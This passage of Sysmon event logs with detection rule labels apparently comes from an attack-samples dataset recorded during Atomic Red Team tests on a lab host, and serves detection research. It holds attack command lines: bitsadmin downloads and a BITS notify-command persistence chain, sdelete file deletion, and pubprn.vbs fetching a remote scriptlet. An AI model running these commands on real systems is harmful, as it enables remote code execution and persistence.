2019-07-19T14:47:52.046322+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3651,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 7040
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D817-5D31-0000-0010C8BA2B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:51.972
"
2019-07-19T14:47:57.227966+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3652,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 1632
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D81D-5D31-0000-0010B8CA2B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""sdelete.exe C:\some\file.txt""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:57.189
"
2019-07-19T14:47:57.274199+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3653,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 7080
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D81D-5D31-0000-0010D7CD2B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:47:57.265
"
2019-07-19T14:48:04.103366+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3654,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 6736
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D824-5D31-0000-001023F42B00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:04.094
"
2019-07-19T14:48:04.131410+00:00,File Download Via Bitsadmin;File Download Via Bitsadmin To A Suspicious Target Folder;File With Suspicious Extension Downloaded Via Bitsadmin;Hacktool - EDR-Freeze Execution;Suspicious Download From File-Sharing Website Via Bitsadmin;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3655,MSEDGEWIN10,"Image: C:\Windows\System32\bitsadmin.exe
RuleName: ''
Description: BITS administration utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 6736
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=5DEB6EC7BB9BD0C85BBE91CBFD92BDC774FE5F8A,MD5=5CD8838F1E275B0C8EADF4B755C04E4F,SHA256=03C7E317E277BBD6C9C1159F8718A9D302E6F78E0D80C09D52A994B7598C0F30,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9
ParentProcessGuid: 747F3D96-D824-5D31-0000-001023F42B00
ProcessId: 1540
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D824-5D31-0000-001075F62B00
CommandLine: bitsadmin.exe   /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1
FileVersion: 7.8.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:04.122
"
2019-07-19T14:48:05.365622+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3656,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 5808
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D825-5D31-0000-0010CF222C00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:05.349
"
2019-07-19T14:48:30.640915+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3657,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 752
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83E-5D31-0000-0010F0D02E00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /create AtomicBITS""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:30.619
"
2019-07-19T14:48:30.660877+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3658,MSEDGEWIN10,"Image: C:\Windows\System32\bitsadmin.exe
RuleName: ''
Description: BITS administration utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /create AtomicBITS""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 752
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=5DEB6EC7BB9BD0C85BBE91CBFD92BDC774FE5F8A,MD5=5CD8838F1E275B0C8EADF4B755C04E4F,SHA256=03C7E317E277BBD6C9C1159F8718A9D302E6F78E0D80C09D52A994B7598C0F30,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9
ParentProcessGuid: 747F3D96-D83E-5D31-0000-0010F0D02E00
ProcessId: 4508
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83E-5D31-0000-001042D32E00
CommandLine: bitsadmin.exe  /create AtomicBITS
FileVersion: 7.8.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:30.655
"
2019-07-19T14:48:30.799468+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3659,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4036
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83E-5D31-0000-0010A2D72E00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:30.775
"
2019-07-19T14:48:30.807486+00:00,File Download Via Bitsadmin;File Download Via Bitsadmin To A Suspicious Target Folder;File With Suspicious Extension Downloaded Via Bitsadmin;Hacktool - EDR-Freeze Execution;Monitoring For Persistence Via BITS;Suspicious Download From File-Sharing Website Via Bitsadmin;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3660,MSEDGEWIN10,"Image: C:\Windows\System32\bitsadmin.exe
RuleName: ''
Description: BITS administration utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4036
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=5DEB6EC7BB9BD0C85BBE91CBFD92BDC774FE5F8A,MD5=5CD8838F1E275B0C8EADF4B755C04E4F,SHA256=03C7E317E277BBD6C9C1159F8718A9D302E6F78E0D80C09D52A994B7598C0F30,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9
ParentProcessGuid: 747F3D96-D83E-5D31-0000-0010A2D72E00
ProcessId: 3732
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83E-5D31-0000-0010AAD92E00
CommandLine: bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1
FileVersion: 7.8.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:30.796
"
2019-07-19T14:48:30.900988+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3661,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 7072
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83E-5D31-0000-001088DE2E00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:30.882
"
2019-07-19T14:48:30.917348+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3662,MSEDGEWIN10,"Image: C:\Windows\System32\bitsadmin.exe
RuleName: ''
Description: BITS administration utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 7072
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=5DEB6EC7BB9BD0C85BBE91CBFD92BDC774FE5F8A,MD5=5CD8838F1E275B0C8EADF4B755C04E4F,SHA256=03C7E317E277BBD6C9C1159F8718A9D302E6F78E0D80C09D52A994B7598C0F30,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9
ParentProcessGuid: 747F3D96-D83E-5D31-0000-001088DE2E00
ProcessId: 3204
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83E-5D31-0000-0010DAE02E00
CommandLine: bitsadmin.exe  /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1
FileVersion: 7.8.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:30.913
"
2019-07-19T14:48:31.012222+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3663,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4332
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83E-5D31-0000-001046E52E00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /complete AtomicBITS""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:30.995
"
2019-07-19T14:48:31.041710+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3664,MSEDGEWIN10,"Image: C:\Windows\System32\bitsadmin.exe
RuleName: ''
Description: BITS administration utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /complete AtomicBITS""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 4332
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=5DEB6EC7BB9BD0C85BBE91CBFD92BDC774FE5F8A,MD5=5CD8838F1E275B0C8EADF4B755C04E4F,SHA256=03C7E317E277BBD6C9C1159F8718A9D302E6F78E0D80C09D52A994B7598C0F30,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9
ParentProcessGuid: 747F3D96-D83E-5D31-0000-001046E52E00
ProcessId: 388
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83F-5D31-0000-0010A2E72E00
CommandLine: bitsadmin.exe  /complete AtomicBITS
FileVersion: 7.8.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:31.038
"
2019-07-19T14:48:31.134374+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3665,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 3760
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83F-5D31-0000-001001EC2E00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /resume AtomicBITS""'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:31.115
"
2019-07-19T14:48:31.157171+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3666,MSEDGEWIN10,"Image: C:\Windows\System32\bitsadmin.exe
RuleName: ''
Description: BITS administration utility
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /resume AtomicBITS""'
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3760
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=5DEB6EC7BB9BD0C85BBE91CBFD92BDC774FE5F8A,MD5=5CD8838F1E275B0C8EADF4B755C04E4F,SHA256=03C7E317E277BBD6C9C1159F8718A9D302E6F78E0D80C09D52A994B7598C0F30,IMPHASH=B0A3CFF8CFDE112945189719F82F9EA9
ParentProcessGuid: 747F3D96-D83F-5D31-0000-001001EC2E00
ProcessId: 3704
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83F-5D31-0000-001053EE2E00
CommandLine: bitsadmin.exe  /resume AtomicBITS
FileVersion: 7.8.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:31.153
"
2019-07-19T14:48:31.240293+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3667,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 4888
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D83F-5D31-0000-00105EF22E00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c '
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:31.222
"
2019-07-19T14:48:36.834888+00:00,Hacktool - EDR-Freeze Execution;Pubprn.vbs Proxy Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3668,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
ParentProcessId: 3912
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: 747F3D96-D6F7-5D31-0000-00104ACE2500
ProcessId: 7140
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D844-5D31-0000-001075082F00
CommandLine: '""C:\Windows\system32\cmd.exe"" /c ""cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "" script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct'
FileVersion: 10.0.17763.1 (WinBuild.160101.0800)
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
UtcTime: 2019-07-19 14:48:36.811
"
2019-07-19T14:48:36.882586+00:00,Hacktool - EDR-Freeze Execution;Pubprn.vbs Proxy Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3669,MSEDGEWIN10,"Image: C:\Windows\System32\cscript.exe
RuleName: ''
Description: Microsoft ® Console Based Script Host
TerminalSessionId: 1
ParentCommandLine: '""C:\Windows\system32\cmd.exe"" /c ""cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "" script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct'
Product: Microsoft ® Windows Script Host
Company: Microsoft Corporation
ParentProcessId: 7140
LogonGuid: 747F3D96-D4B4-5D31-0000-002051090500
Hashes: SHA1=0E3C0779D8EAAD3B00363D7890DDC8272B510D49,MD5=A45586B3A5A291516CD10EF4FD3EE768,SHA256=59D3CDC7D51FA34C6B27B8B04EA17992955466EB25022B7BD64880AB35DF0BBC,IMPHASH=2B44D2206B9865383429E9C1524F1CAC
ParentProcessGuid: 747F3D96-D844-5D31-0000-001075082F00
ProcessId: 2484
CurrentDirectory: C:\AtomicRedTeam\
ProcessGuid: 747F3D96-D844-5D31-0000-0010C70A2F00
CommandLine: cscript.exe  /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost  script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct
FileVersion: 5.812.10240.16384
User: MSEDGEWIN10\IEUser
LogonId: '0x50951'
IntegrityLevel: High
ParentImage: C:\Windows\System32\cmd.exe
UtcTime: 2019-07-19 14:48:36.869
"
2019-07-19T14:48:37.264352+00:00,Hacktool - EDR-Freeze Execution;UAC Bypass Using NTFS Reparse Point - Process,data/EVTX-ATTACK-SAMPLES/AutomatedTestingTools/PanacheSysmon_vs_AtomicRedTeam01.evtx,1,Microsoft-Windows-Sysmon,1,3670,MSEDGEWIN10,"Image: C:\Windows\System32\cmd.exe
RuleName: ''
Description: Windows Command Processor
TerminalSessionId: 1
ParentCommandLine: powershell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
